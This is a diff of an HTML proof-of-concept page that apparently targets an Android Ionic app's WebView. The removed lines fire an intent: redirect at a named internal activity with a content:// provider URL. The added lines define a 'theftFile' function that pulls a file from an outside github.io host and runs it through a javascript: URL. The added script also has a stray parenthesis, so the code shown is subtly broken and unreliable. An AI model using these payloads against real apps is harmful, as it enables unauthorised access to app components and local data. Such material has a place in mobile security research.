@@ -1,11 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <script>
-    window.location.href = "intent:#Intent;component=com.ionicframework.tornv2301860/.ui.TemporaryBrowserActivity;S.URL_KEY=content%3A%2F%2Fcom.web.myappProvider%2Findex.html;end";
-  </script>
-</head>
+<html>
+  <head>
+    <title>page</title>
+  </head>
+  <body>
+    <script type="text/javascript">
+      function theftFile(path, callback) {
+        var oReq = new XMLHttpRequest();
 
+        oReq.open(
+          'GET',
+          'https://0xblaziken.github.io/builds/'+encodeURIComponent(path)),
+          true
+        );
+        oReq.onload = function (e) {
+          callback(oReq.responseText);
+        };
+        oReq.onerror = function (e) {
+          callback(null);
+        };
+        oReq.send();
+      }
+
+      theftFile('xt.txt', function (contents) {
+        location.href =
+          'javascript:alert(contents)';
+      });
+    </script>
+  </body>
 </html>
